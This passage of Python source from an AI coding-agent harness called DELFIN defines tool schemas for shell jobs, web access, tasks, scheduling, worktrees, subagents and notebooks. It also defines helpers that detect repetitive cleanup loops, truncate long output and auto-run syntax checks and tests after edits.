                    "wait_seconds": {
                        "type": "integer",
                        "description": (
                            "Block until the job finishes or this many "
                            "seconds elapse (capped at 300/call). Returns "
                            "early the moment the job ends. Default 0 "
                            "(return immediately)."
                        ),
                    },
                },
                "required": ["job_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash_output",
            "description": (
                "Read what a background job has written so far to stdout "
                "and stderr. Smart-truncates to head+tail when output "
                "is long (so the tail with the traceback is always "
                "visible). Safe to call WHILE the job is still running "
                "— it shows the latest output, not a final snapshot."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "job_id": {
                        "type": "string",
                        "description": "ID returned by bash_background.",
                    },
                    "head_lines": {
                        "type": "integer",
                        "description": "Lines to keep from the start (default 60).",
                    },
                    "tail_lines": {
                        "type": "integer",
                        "description": "Lines to keep from the end (default 200).",
                    },
                },
                "required": ["job_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "web_search",
            "description": (
                "Search the web via DuckDuckGo HTML and return a list "
                "of {title, url, snippet} results. Use this when "
                "Jerome's project needs API specifics from a library "
                "that isn't in DELFIN's indexed docs (BoTorch, Ax, "
                "scikit-optimize, etc.). Don't use it for things you "
                "can find in the codebase — Grep / Read first."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Search terms (3-10 words ideal).",
                    },
                    "max_results": {
                        "type": "integer",
                        "description": "Cap on hits (default 8, max 20).",
                    },
                },
                "required": ["query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "web_fetch",
            "description": (
                "Download a single URL and return plain text. HTML "
                "is stripped to readable text; text/* is passed "
                "through. Binaries / PDFs are refused (use bash + "
                "curl + a tempfile for those). Localhost / RFC1918 / "
                "*.internal hosts are blocked. 1 MB / 50k char cap."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Absolute http(s) URL to fetch.",
                    },
                    "timeout_s": {
                        "type": "integer",
                        "description": "Request timeout (default 15).",
                    },
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "task_create",
            "description": (
                "Add a planning task to this session's task list within "
                "the current project (implements TaskCreate). "
                "Useful for "
                "multi-step integrations: 'integrate BoTorch wrapper', "
                "'add comparison notebook', 'write regression tests'. "
                "Tasks survive session restarts for the same saved session "
                "via "
                "<workspace>/.delfin/session_tasks.json. Status starts "
                "at 'pending'; switch to 'in_progress' when you start "
                "work and 'completed' when done. Each task has a small "
                "session-relative number `seq` (1, 2, 3 …) for talking to "
                "the user, plus a global `id` — always pass the `id` (not "
                "`seq`) to task_update/task_get."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "subject": {
                        "type": "string",
                        "description": "Short imperative title (3-8 words).",
                    },
                    "description": {
                        "type": "string",
                        "description": "What needs to be done (multiline OK).",
                    },
                    "active_form": {
                        "type": "string",
                        "description": (
                            "Optional present-continuous form for "
                            "spinners (e.g. 'Integrating BoTorch')."
                        ),
                    },
                },
                "required": ["subject"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "task_update",
            "description": (
                "Update an existing task: change status, subject, "
                "description, or active_form. Use status='in_progress' "
                "when starting and 'completed' immediately when done — "
                "don't batch completion messages."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "task_id": {
                        "type": "integer",
                        "description": "ID returned by task_create.",
                    },
                    "status": {
                        "type": "string",
                        "enum": [
                            "pending", "in_progress",
                            "completed", "deleted",
                        ],
                    },
                    "subject": {"type": "string"},
                    "description": {"type": "string"},
                    "active_form": {"type": "string"},
                },
                "required": ["task_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "task_list",
            "description": (
                "List all tasks for the current workspace. By default "
                "deleted tasks are filtered out. Use this to recap "
                "progress at the start of a multi-day session, or to "
                "find what's left when picking up a paused project."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "include_deleted": {
                        "type": "boolean",
                        "description": (
                            "Include tasks with status='deleted' "
                            "(default false)."
                        ),
                    },
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "task_get",
            "description": (
                "Fetch a single task record by ID. Returns the full "
                "task dict (subject, description, status, active_form, "
                "created_at, updated_at) or an error if the task does "
                "not exist. Cheaper than task_list when you already "
                "know the ID — typical use after task_create."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "task_id": {
                        "type": "integer",
                        "description": "Task ID returned by task_create.",
                    },
                },
                "required": ["task_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "project_introspect",
            "description": (
                "One-call snapshot of the workspace's state: "
                "existing venv(s) with Python version + installed "
                "package count, manifest files (pyproject / "
                "requirements / Pipfile / Cargo.toml / package.json), "
                "test framework, src vs flat layout, git branch + "
                "dirty status. Call this at the START of a "
                "session in an unfamiliar project — it spares you "
                "3-5 read_file calls. The agent can then decide "
                "freely what to do next: install a single dep, run "
                "tests, refactor — no workflow is implied."
            ),
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "run_tests",
            "description": (
                "Run pytest with structured JSON output (uses "
                "pytest-json-report when installed, junitxml as "
                "fallback). Returns pass / fail / error counts plus "
                "a list of failures with node-id + truncated message. "
                "Prefer this over `bash python -m pytest` — parsing "
                "human-readable pytest output is fragile and the "
                "agent often misses the failing test ID."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": (
                            "Pytest path / nodeid (e.g. 'tests/' or "
                            "'tests/test_x.py::test_y'). Empty = "
                            "discovery from cwd."
                        ),
                    },
                    "pytest_args": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Extra pytest CLI args (-x, -k, -m, ...).",
                    },
                    "timeout_s": {
                        "type": "integer",
                        "minimum": 5, "maximum": 1800,
                    },
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "apply_patch",
            "description": (
                "Apply a unified-diff patch to files in the "
                "workspace. Use for bulk changes (5+ hunks) where "
                "edit_file would need many round-trips. Atomic: on "
                "any hunk failure NO files are mutated. Pass "
                "check_only=true for a dry-run validation."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "diff": {
                        "type": "string",
                        "description": (
                            "Full unified diff (must include "
                            "--- a/file / +++ b/file headers and "
                            "@@ hunk markers)."
                        ),
                    },
                    "check_only": {"type": "boolean"},
                },
                "required": ["diff"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "find_definition",
            "description": (
                "Locate the definition of a symbol in the "
                "workspace. Python uses jedi (precise, follows "
                "imports); other languages fall back to a "
                "language-aware grep. Returns matches with file + "
                "line + preview."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "symbol": {
                        "type": "string",
                        "description": "Identifier (no qualification needed).",
                    },
                    "file_hint": {
                        "type": "string",
                        "description": (
                            "Optional file (workspace-relative) to "
                            "anchor the search — speeds jedi up for "
                            "large repos."
                        ),
                    },
                    "language": {
                        "type": "string",
                        "enum": ["auto", "python", "any"],
                    },
                },
                "required": ["symbol"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "find_references",
            "description": (
                "Find every place a symbol is referenced. Same "
                "backends as find_definition. Capped at 50 matches."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "symbol": {"type": "string"},
                    "file_hint": {"type": "string"},
                    "language": {
                        "type": "string",
                        "enum": ["auto", "python", "any"],
                    },
                },
                "required": ["symbol"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "push_notification",
            "description": (
                "Send a desktop notification. Local-only "
                "(notify-send / terminal-notifier / Win toast). "
                "Use sparingly: when a long task finishes or "
                "approval is required."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "title": {"type": "string"},
                    "body": {"type": "string"},
                    "urgency": {
                        "type": "string",
                        "enum": ["low", "normal", "critical"],
                    },
                },
                "required": ["title"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "remote_trigger",
            "description": (
                "POST a small JSON payload to the user-configured "
                "remoteTrigger webhook (settings.json -> "
                "remoteTrigger.url). HTTPS only; private / "
                "metadata IPs blocked. The URL is NOT chosen by "
                "the agent — only what the user pre-configured."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "event": {"type": "string"},
                    "payload": {
                        "type": "object",
                        "description": "Free-form JSON-serialisable body.",
                    },
                },
                "required": ["event"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "schedule_wakeup",
            "description": (
                "Schedule a single future agent invocation. Mirrors "
                "the canonical ScheduleWakeup. Use when you need to "
                "check back on something later (long-running build, "
                "external job). The dashboard will fire the prompt "
                "back at the chosen time. Persists across restarts."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "delay_seconds": {
                        "type": "integer",
                        "minimum": 60,
                        "maximum": 3600,
                        "description": "When to fire (60 to 3600 sec).",
                    },
                    "prompt": {
                        "type": "string",
                        "description": "Prompt to fire on wake-up.",
                    },
                    "reason": {
                        "type": "string",
                        "description": "Short telemetry reason.",
                    },
                },
                "required": ["delay_seconds", "prompt", "reason"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "cron_create",
            "description": (
                "Create a recurring scheduled invocation (interval-based). "
                "DELFIN's minimal cron substitute: a single ``every_seconds`` "
                "interval, no full cron expressions. Persists across restarts."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "every_seconds": {
                        "type": "integer",
                        "minimum": 60,
                        "description": "Interval between fires (>= 60).",
                    },
                    "prompt": {"type": "string"},
                    "reason": {"type": "string"},
                    "fire_immediately": {"type": "boolean"},
                },
                "required": ["every_seconds", "prompt"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "cron_list",
            "description": "List all active scheduled / cron entries.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "cron_delete",
            "description": "Delete a scheduled / cron entry by id.",
            "parameters": {
                "type": "object",
                "properties": {
                    "entry_id": {"type": "string"},
                },
                "required": ["entry_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "enter_worktree",
            "description": (
                "Create a temporary git worktree on a fresh branch "
                "for the current task. Implements "
                "EnterWorktree. Subsequent edits/bash should run "
                "inside the returned worktree path; the user's main "
                "tree is untouched. The branch is auto-cleaned on "
                "exit_worktree if no commits were made. Pass the "
                "repository root (defaults to the current workspace)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "repo_dir": {
                        "type": "string",
                        "description": (
                            "Repository root (default: current "
                            "workspace). Must be a git repo."
                        ),
                    },
                    "branch_prefix": {
                        "type": "string",
                        "description": "Prefix for the auto-generated branch (default: 'agent').",
                    },
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "exit_worktree",
            "description": (
                "Tear down a worktree previously created via "
                "enter_worktree. If commits or unstaged changes "
                "exist and keep_if_changed=true (default), the "
                "worktree path and branch survive so the user can "
                "review them; otherwise the directory and branch "
                "are removed."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Worktree path returned by enter_worktree.",
                    },
                    "keep_if_changed": {
                        "type": "boolean",
                        "description": "Keep dir+branch if changes detected (default true).",
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "worktree_merge",
            "description": (
                "Merge a worktree's changes back into the main "
                "tree, safely. Stages the worktree's full state "
                "(including new files), then applies it to the "
                "target repo's working tree ONLY if it applies "
                "cleanly — on any conflict the target is left "
                "untouched and the worktree is kept for manual "
                "merge. Changes land uncommitted so you can review "
                "(`git diff`) and commit. Completes the fan-out → "
                "review (worktree diff) → merge flow. Pass the "
                "worktree path returned by enter_worktree (or the "
                "final_path from a subagent's worktree_summary)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Worktree path to merge from.",
                    },
                    "base_ref": {
                        "type": "string",
                        "description": (
                            "Commit the worktree branched from "
                            "(default: auto-detected via merge-base "
                            "with the target's HEAD)."
                        ),
                    },
                    "target_dir": {
                        "type": "string",
                        "description": (
                            "Repo to merge into (default: the "
                            "worktree's source repository)."
                        ),
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "subagent",
            "description": (
                "Delegate a self-contained task to an isolated "
                "sub-agent. Implements Agent tool. The "
                "sub-agent runs its own tool-calling loop with a "
                "narrow tool set (read-only by default) and returns "
                "a single summary. Use for: parallel research, "
                "read-only audits, planning that should not edit. "
                "Pick subagent_type carefully — 'explore' / 'plan' / "
                "'code-reviewer' are read-only; 'general-purpose' "
                "inherits the parent's full permissions. Default caps "
                "(configurable in settings): 40 tool calls, 300s wall "
                "clock, 16k output tokens. Set background=true to run "
                "without blocking and collect later with subagent_result."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "subagent_type": {
                        "type": "string",
                        # Resolved at module import — covers built-in
                        # presets plus any pack/agents/*_subagent.md and
                        # ~/.delfin/subagents/*_subagent.md user-extended
                        # types. Kept defensive in case the loader fails.
                        "enum": (
                            __import__(
                                "delfin.agent.subagents",
                                fromlist=["subagent_type_names"],
                            ).subagent_type_names()
                            or [
                                "explore",
                                "plan",
                                "code-reviewer",
                                "general-purpose",
                            ]
                        ),
                    },
                    "description": {
                        "type": "string",
                        "description": (
                            "Brief 3-7 word label for the task "
                            "(e.g. 'find audit-log call-sites')."
                        ),
                    },
                    "prompt": {
                        "type": "string",
                        "description": (
                            "Self-contained briefing — the "
                            "sub-agent has NO context from the "
                            "parent conversation. State the goal, "
                            "the relevant files, anything ruled "
                            "out, and the desired form of the "
                            "answer."
                        ),
                    },
                    "background": {
                        "type": "boolean",
                        "description": (
                            "true = run in the background and return "
                            "immediately; the result appears in the "
                            "subagent panel. Use for independent research "
                            "that should not block the main task."
                        ),
                    },
                    "resume_id": {
                        "type": "string",
                        "description": (
                            "Continue a FINISHED subagent with its "
                            "context intact: pass the sa_id returned by "
                            "a previous subagent call and a follow-up "
                            "prompt. The stored conversation is replayed "
                            "in front of the new prompt; subagent_type/"
                            "description from the original run win."
                        ),
                    },
                    "isolation": {
                        "type": "string",
                        "enum": ["", "worktree"],
                        "description": (
                            "Optional isolation mode. 'worktree' "
                            "creates a fresh git worktree under "
                            "$TMPDIR and runs the sub-agent there, "
                            "so any edits stay off the user's "
                            "working tree until reviewed. Empty "
                            "string (default) = inherit parent CWD."
                        ),
                    },
                },
                "required": ["subagent_type", "description", "prompt"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "subagent_result",
            "description": (
                "Collect the status/result of a BACKGROUND subagent by the "
                "sa_id that subagent(background=true) returned. Returns "
                "status 'running' (still working), 'finished' (with the "
                "subagent's final_text report), or 'unknown'. Poll this "
                "instead of blocking; if still running, do other work and "
                "check again later."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "sa_id": {
                        "type": "string",
                        "description": "ID returned by subagent(background=true).",
                    },
                },
                "required": ["sa_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "skill",
            "description": (
                "Invoke a user- or project-scoped skill (a "
                "Markdown playbook). Skills live in "
                "~/.delfin/skills/<name>/SKILL.md or "
                "<workspace>/.delfin/skills/<name>/SKILL.md. The "
                "skill's body is returned verbatim — read it and "
                "follow the instructions. Use this when the user "
                "types '/skill-name' or when you want to consult an "
                "established playbook (e.g. /security-review, /init). "
                "Pass `args` to forward parameters to the skill."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "name": {
                        "type": "string",
                        "description": "Skill name without the leading slash.",
                    },
                    "args": {
                        "type": "string",
                        "description": (
                            "Optional free-text arguments forwarded "
                            "to the skill body."
                        ),
                    },
                },
                "required": ["name"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "exit_plan_mode",
            "description": (
                "Submit the finalized plan to the user for approval. "
                "Implements ExitPlanMode. ONLY call this in "
                "'plan' mode after you've assembled a complete plan; "
                "while in plan mode, write/edit/bash tools are blocked. "
                "On approval the agent's mode switches to "
                "'acceptEdits' (or whatever the user picks) so the "
                "next turn can actually execute the plan. Pass the "
                "full plan as Markdown — bullet lists are ideal. "
                "Don't use this for clarifying questions; use "
                "ask_user_question for those."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "plan": {
                        "type": "string",
                        "description": (
                            "Final plan in Markdown. Should describe "
                            "every step you intend to take, in order, "
                            "and call out anything risky or "
                            "irreversible."
                        ),
                    },
                },
                "required": ["plan"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "ask_user_question",
            "description": (
                "Ask the user a structured multi-choice question and "
                "wait for their answer. Implements "
                "AskUserQuestion. Useful for clarifying ambiguous "
                "instructions, getting design decisions, choosing "
                "between approaches. Returns JSON with the user's "
                "selected option label(s). Don't use for free-text "
                "questions — just write them out as plain prose. "
                "Don't use for plan approval — emit ExitPlanMode "
                "instead. Has no effect when the agent runs without "
                "an ask-user UI bound (e.g. headless scripts) and "
                "returns an error in that case."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "question": {
                        "type": "string",
                        "description": (
                            "Full question, ending with a question "
                            "mark. Be specific."
                        ),
                    },
                    "header": {
                        "type": "string",
                        "description": (
                            "Short label / chip (max 12 chars) shown "
                            "alongside the question."
                        ),
                    },
                    "options": {
                        "type": "array",
                        "minItems": 2,
                        "maxItems": 6,
                        "items": {
                            "type": "object",
                            "properties": {
                                "label": {"type": "string"},
                                "description": {"type": "string"},
                                "preview": {
                                    "type": "string",
                                    "description": (
                                        "Optional markdown shown next to the "
                                        "option button. Use for code snippets, "
                                        "ASCII mockups, diff previews, or "
                                        "configuration examples the user can "
                                        "compare side-by-side before clicking."
                                    ),
                                },
                            },
                            "required": ["label"],
                        },
                        "description": (
                            "Mutually-exclusive choices. Each option "
                            "has a short label, an optional description "
                            "(one-line trade-off), and an optional "
                            "markdown ``preview`` for visual comparison "
                            "(ASCII mockups, code snippets, diffs). "
                            "Always 2-6 options."
                        ),
                    },
                    "multiSelect": {
                        "type": "boolean",
                        "description": (
                            "Allow selecting multiple options "
                            "(default false). Previews are only "
                            "supported for single-select questions."
                        ),
                    },
                },
                "required": ["question", "options"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "notebook_read",
            "description": (
                "Read a Jupyter notebook (.ipynb) cell-aware: returns "
                "an ordered list of {idx, cell_type, source, "
                "output_summary}. Outputs are summarised (counts + "
                "MIME types) — the agent rarely needs the full base64 "
                "image data and the chat would drown in it. Use this "
                "instead of read_file for .ipynb files; read_file "
                "would dump the JSON structure verbatim."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "Notebook path (workspace-relative or "
                            "absolute under an allowed root)."
                        ),
                    },
                    "max_source_chars": {
                        "type": "integer",
                        "description": (
                            "Per-cell source cap; cells longer than "
                            "this are truncated head+tail with a "
                            "marker. Default 4000."
                        ),
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "notebook_edit",
            "description": (
                "Modify a single cell in a Jupyter notebook (.ipynb) "
                "atomically. Modes: 'replace' (overwrite cell at idx), "
                "'insert_before' / 'insert_after' (add a new cell), "
                "'delete' (remove cell at idx). Always call "
                "notebook_read FIRST to know the indexes. Source must "
                "be the full cell text (not a substring). Use this "
                "instead of edit_file/write_file for .ipynb files."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Notebook path.",
                    },
                    "cell_idx": {
                        "type": "integer",
                        "description": (
                            "0-based cell index. For insert_before / "
                            "insert_after, this is the reference cell."
                        ),
                    },
                    "mode": {
                        "type": "string",
                        "enum": [
                            "replace", "insert_before",
                            "insert_after", "delete",
                        ],
                        "description": "What to do at cell_idx.",
                    },
                    "source": {
                        "type": "string",
                        "description": (
                            "Full cell text (required except for "
                            "mode='delete'). Use real newlines, not "
                            "escaped \\\\n."
                        ),
                    },
                    "cell_type": {
                        "type": "string",
                        "enum": ["code", "markdown", "raw"],
                        "description": (
                            "Cell type for replace / insert. Default 'code'."
                        ),
                    },
                },
                "required": ["path", "cell_idx", "mode"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash_kill",
            "description": (
                "Stop a background bash job. Sends SIGTERM to the entire "
                "process group, waits ~3s, then sends SIGKILL if needed. "
                "Use when a long-running optimization needs to be aborted "
                "early or you mis-typed the command."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "job_id": {
                        "type": "string",
                        "description": "ID returned by bash_background.",
                    },
                },
                "required": ["job_id"],
            },
        },
    },
]


_THRASH_CLEANUP_LIMIT = 4   # cleanup/reorg commands in a turn before nudging
_THRASH_REWRITE_LIMIT = 4   # rewrites of the SAME file in a turn before nudging
_THRASH_CLEANUP_RE = re.compile(r"(?:^|&&|;|\|)\s*(?:rm\s+-rf|rmdir|mv)\b")


def _thrash_check(state: dict, fn_name: str, fn_args: dict) -> str:
    """Detect low-progress loops and return a ONE-TIME soft hint (or "").

    Catches the wasted-work patterns seen in real runs (validator_kit,
    2026-06-25: $18/90 min, much of it thrash): repeated cleanup/reorg
    commands, and the SAME file rewritten over and over. The hint is prepended
    to that tool result so the model reads it and changes approach — it never
    stops real work (the consecutive-identical-error check is the hard stop).
    Pure + stateful via the passed-in ``state`` dict, so it is unit-testable.
    """
    try:
        sent = state.setdefault("hints", set())
        if fn_name in ("bash", "Bash"):
            cmd = str((fn_args or {}).get("command", ""))
            if _THRASH_CLEANUP_RE.search(cmd):
                state["cleanup"] = state.get("cleanup", 0) + 1
                if state["cleanup"] >= _THRASH_CLEANUP_LIMIT and "cleanup" not in sent:
                    sent.add("cleanup")
                    return (
                        "⚠ Progress check: several cleanup/reorg commands "
                        "(rm/mv/rmdir) this turn. Stop reorganizing — settle on "
                        "ONE final layout, state it, and write files directly "
                        "to it instead of moving them around."
                    )
        elif fn_name in ("write_file", "edit_file", "multi_edit", "Write", "Edit"):
            p = str((fn_args or {}).get("path") or (fn_args or {}).get("file_path") or "")
            if p:
                counts = state.setdefault("writes", {})
                counts[p] = counts.get(p, 0) + 1
                key = "rewrite:" + p
                if counts[p] >= _THRASH_REWRITE_LIMIT and key not in sent:
                    sent.add(key)
                    return (
                        f"⚠ Progress check: {p.rsplit('/', 1)[-1]} rewritten "
                        f"{counts[p]}× this turn. read_file it once, then make "
                        f"ONE targeted edit_file instead of re-writing the whole "
                        f"file — repeated full rewrites usually mean you're "
                        f"guessing; verify the current contents first."
                    )
    except Exception:
        return ""
    return ""


def _smart_truncate(text: str, cap: int, label: str) -> str:
    """Cap a long output by keeping HEAD and TAIL.

    Pure head-truncation hides the most useful part of a Python error:
    tracebacks live at the END. So when output exceeds ``cap``, keep
    roughly 30% from the start and 70% from the end with a marker in
    between explaining how many chars were dropped. Stays a no-op when
    text fits.
    """
    if not text or len(text) <= cap:
        return text
    head_size = max(cap // 3, 256)
    tail_size = cap - head_size
    if tail_size < 256:
        # Fall back to plain head-truncation for very small caps.
        omitted = len(text) - cap
        return text[:cap] + f"\n... ({label} truncated, {omitted} chars omitted)"

    head = text[:head_size]
    # Snap head to a line boundary if possible so we don't slice mid-line.
    nl = head.rfind("\n")
    if nl > head_size * 0.6:
        head = head[: nl + 1]
        tail_size = cap - len(head)

    tail = text[-tail_size:]
    nl = tail.find("\n")
    if 0 < nl < tail_size * 0.4:
        tail = tail[nl + 1:]

    omitted = len(text) - len(head) - len(tail)
    marker = (
        f"\n... ({label} truncated, {omitted} chars from the middle "
        f"omitted; head and tail preserved so tracebacks survive)\n"
    )
    return head + marker + tail


# Tool-result-aware context editing for long tool-call loops.
_TOOL_CONTEXT_CHAR_BUDGET = 60000   # ~15k tokens of accumulated tool output
_TOOL_KEEP_RECENT = 8               # most recent tool results kept verbatim
_ELIDED_PREFIX = "[earlier tool output elided to free context"


def _resolve_max_tool_rounds() -> int:
    """Per-turn tool-round budget (``agent.max_tool_rounds``, default 500).

    A value of 0 (or negative) disables the round cap — the per-turn cost
    circuit-breaker and the consecutive-failure abort then remain the only
    stops. Reads defensively so a missing/corrupt settings file falls back
    to the 500 default rather than throwing inside the stream loop.
    """
    try:
        from delfin import user_settings
        val = int((user_settings.load_settings().get("agent", {}) or {})
                  .get("max_tool_rounds", 500))
    except Exception:
        return 500
    return 100_000 if val <= 0 else val


def _resolve_auto_verify() -> tuple[str, str]:
    """(mode, command) for auto-verification. mode ∈ smart|syntax|command|off
    (default smart). Reads agent.auto_verify[_command]; never raises."""
    try:
        from delfin import user_settings
        ag = (user_settings.load_settings().get("agent", {}) or {})
        mode = str(ag.get("auto_verify", "smart") or "smart").strip().lower()
        cmd = str(ag.get("auto_verify_command", "") or "").strip()
    except Exception:
        return "smart", ""
    if mode not in ("smart", "syntax", "command", "off"):
        mode = "smart"
    return mode, cmd


def _syntax_check(edited_paths: list) -> str:
    """py_compile the edited .py files (fast, no execution). Returns a summary
    of any syntax errors, or ""."""
    import py_compile
    probs: list[str] = []
    for p in edited_paths:
        try:
            py_compile.compile(str(p), doraise=True)
        except py_compile.PyCompileError as exc:
            probs.append(str(exc).strip()[:400])
        except FileNotFoundError:
            continue
        except Exception:
            continue
    return "\n".join(probs)


def _detect_test_command(workspace) -> str:
    """A fast pytest command if the workspace clearly has a Python test setup,
    else "". Looks for a tests/ dir with test_*.py, or top-level test_*.py /
    conftest.py — and requires pytest to be importable. ``-x`` stops at the
    first failure so a broken suite reports quickly."""
    try:
        ws = Path(workspace)
        import importlib.util
        if importlib.util.find_spec("pytest") is None:
            return ""
        tdir = ws / "tests"
        has = (tdir.is_dir() and any(tdir.glob("test_*.py"))) \
            or any(ws.glob("test_*.py")) or (ws / "conftest.py").is_file()
        return "python -m pytest -x -q" if has else ""
    except Exception:
        return ""


# Workspaces whose test suite ran too slow to auto-verify per turn — probed
# once, then skipped (syntax-only) so a slow suite isn't re-run every turn.
_SLOW_TEST_WS: set = set()


def _run_test_command(command: str, workspace, timeout: float) -> tuple[str, bool]:
    """Run a verification command. Returns (problem_summary, timed_out)."""
    try:
        r = subprocess.run(command, shell=True, cwd=str(workspace),
                           capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return "", True
    except Exception:
        return "", False
    if r.returncode != 0:
        out = ((r.stdout or "") + "\n" + (r.stderr or "")).strip()
        return f"`{command}` failed (exit {r.returncode}):\n{out[-1800:]}", False
    return "", False


def _scoped_test_dir(edited_paths: list, workspace) -> Optional[Path]:
    """The package dir to scope auto-verify's test run to — the package that owns
    the files the agent just edited.

    Running pytest at the WORKSPACE root collects every test file beneath it, so
    unrelated or broken tests in a sibling directory (an earlier task's
    leftovers) fail and falsely flag the agent's clean code as broken (observed
    2026-06-25: a fresh ``spreadsheet_test/`` package was all-green, but
    auto-verify ran the whole workspace's pytest and hit stale tests in a
    sibling dir). Scoping the run to what was actually edited avoids that.

    Climbs from the common ancestor of the edited files up to (never above) the
    workspace, returning the first dir that has a ``tests/`` dir or test files.
    Returns ``None`` when it can't narrow below the workspace (→ caller keeps the
    workspace-wide behaviour)."""
    try:
        ws = Path(workspace).resolve()
        dirs = [Path(p).resolve().parent for p in edited_paths if p]
        if not dirs:
            return None
        import os as _os
        common = Path(_os.path.commonpath([str(d) for d in dirs]))
        if common != ws and ws not in common.parents:
            return None                       # edited outside the workspace
        cur = common
        while True:
            if (cur / "tests").is_dir() and any((cur / "tests").glob("test_*.py")):
                return cur
            if any(cur.glob("test_*.py")) or (cur / "conftest.py").is_file():
                return cur
            if cur == ws or ws not in cur.parents:
                return None
            cur = cur.parent
    except Exception:
        return None


def _run_auto_verify(edited_paths: list, mode: str, command: str,
                     workspace) -> str:
    """Verify code the agent just edited. Returns a short problem summary when
    something is wrong (→ force a fix round), or "" when clean. Never raises —
    verification failing closed would be worse than not verifying.

    Modes: ``syntax`` (py_compile only), ``command`` (run ``command``),
    ``smart`` (syntax first; then, if the workspace has a detectable test
    suite, run it with a timeout — and remember a too-slow suite so it isn't
    re-run every turn), ``off``.
    """
    try:
        if mode == "off":
            return ""
        if mode == "command" and command:
            prob, _ = _run_test_command(command, workspace, 180)
            return prob
        if mode in ("syntax", "smart"):
            syn = _syntax_check(edited_paths)
            if syn or mode == "syntax":
                return syn
            # smart: syntax clean → try the project's tests (bounded + adaptive)
            ws_key = str(workspace)
            if ws_key in _SLOW_TEST_WS:
                return ""
            # Scope the run to the package the agent edited, not the whole
            # workspace — otherwise stale/broken tests in a sibling dir falsely
            # fail and flag clean code (bug 2026-06-25).
            scope = _scoped_test_dir(edited_paths, workspace) or Path(workspace)
            cmd = command or _detect_test_command(scope)
            if not cmd:
                return ""
            prob, timed_out = _run_test_command(cmd, scope, 60)
            if timed_out:
                _SLOW_TEST_WS.add(ws_key)    # don't re-run a slow suite each turn
                return ""
            return prob
    except Exception:
        return ""
    return ""


def _cached_tokens_of(usage) -> int:
    """Prompt tokens served from the endpoint's prefix cache, read defensively
    from the OpenAI/vLLM ``usage.prompt_tokens_details.cached_tokens`` field.
    Returns 0 when the endpoint doesn't report it. Never raises."""
    try:
        det = getattr(usage, "prompt_tokens_details", None)
        return int(getattr(det, "cached_tokens", 0) or 0) if det else 0
    except Exception:
        return 0


def _record_security_event(kind: str, tool: str, detail: str,
                           *, blocked: bool = True) -> None:
    """Surface a containment decision to the visible security-event panel.
    Lazy + best-effort: never affects the gate's behaviour."""
    try:
        from . import security_events
        security_events.record(kind, tool, detail, blocked=blocked)
    except Exception:
        pass


def _tool_context_char_budget(caps) -> int:
    """Char budget for accumulated tool output before the OLDEST results are
    elided, scaled to the model's real context window.

    The fixed 60k-char (~15k-token) default elides aggressively — fine for an
    8k local model, but on a 262k-context model (e.g. KIT qwen) it throws away
    earlier file reads at ~6% of the window, forcing the agent to re-page the
